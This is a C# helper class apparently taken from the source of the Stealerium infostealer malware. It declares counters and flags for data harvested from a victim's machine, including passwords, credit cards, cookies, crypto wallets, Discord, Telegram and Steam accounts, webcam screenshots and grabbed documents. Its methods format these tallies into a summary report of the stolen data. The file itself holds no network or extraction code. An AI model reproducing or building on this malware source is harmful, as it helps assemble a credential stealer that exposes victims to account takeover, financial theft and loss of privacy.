using System.Collections.Generic;

namespace Stealerium.Helpers;

internal sealed class Counter
{
	public static int Passwords = 0;

	public static int CreditCards = 0;

	public static int AutoFill = 0;

	public static int Cookies = 0;

	public static int History = 0;

	public static int Bookmarks = 0;

	public static int Downloads = 0;

	public static int Vpn = 0;

	public static int Pidgin = 0;

	public static int Wallets = 0;

	public static int BrowserWallets = 0;

	public static int FtpHosts = 0;

	public static bool Element = false;

	public static bool Signal = false;

	public static bool Tox = false;

	public static bool Icq = false;

	public static bool Skype = false;

	public static bool Discord = false;

	public static bool Telegram = false;

	public static bool Outlook = false;

	public static bool Steam = false;

	public static bool Uplay = false;

	public static bool BattleNet = false;

	public static int SavedWifiNetworks = 0;

	public static bool ProductKey = false;

	public static bool DesktopScreenshot = false;

	public static bool WebcamScreenshot = false;

	public static int GrabberImages = 0;

	public static int GrabberDocuments = 0;

	public static int GrabberDatabases = 0;

	public static int GrabberSourceCodes = 0;

	public static bool BankingServices = false;

	public static bool CryptoServices = false;

	public static bool PornServices = false;

	public static bool SocialServices = false;

	public static List<string> DetectedBankingServices = new List<string>();

	public static List<string> DetectedCryptoServices = new List<string>();

	public static List<string> DetectedPornServices = new List<string>();

	public static List<string> DetectedSocialServices = new List<string>();

	public static string GetSValue(string application, bool value)
	{
		if (!value)
		{
			return "";
		}
		return "\n   ∟ " + application;
	}

	public static string GetIValue(string application, int value)
	{
		if (value == 0)
		{
			return "";
		}
		return "\n   ∟ " + application + ": " + value;
	}

	public static string GetLValue(string application, List<string> value, char separator = '∟')
	{
		value.Sort();
		if (value.Count == 0)
		{
			return "\n   " + separator + " " + application + " (No data)";
		}
		return "\n   " + separator + " " + application + ":\n\t\t" + separator + " " + string.Join("\n\t\t" + separator + " ", value);
	}

	public static string GetBValue(bool value, string success, string failed)
	{
		if (!value)
		{
			return "\n   ∟ " + failed;
		}
		return "\n   ∟ " + success;
	}
}
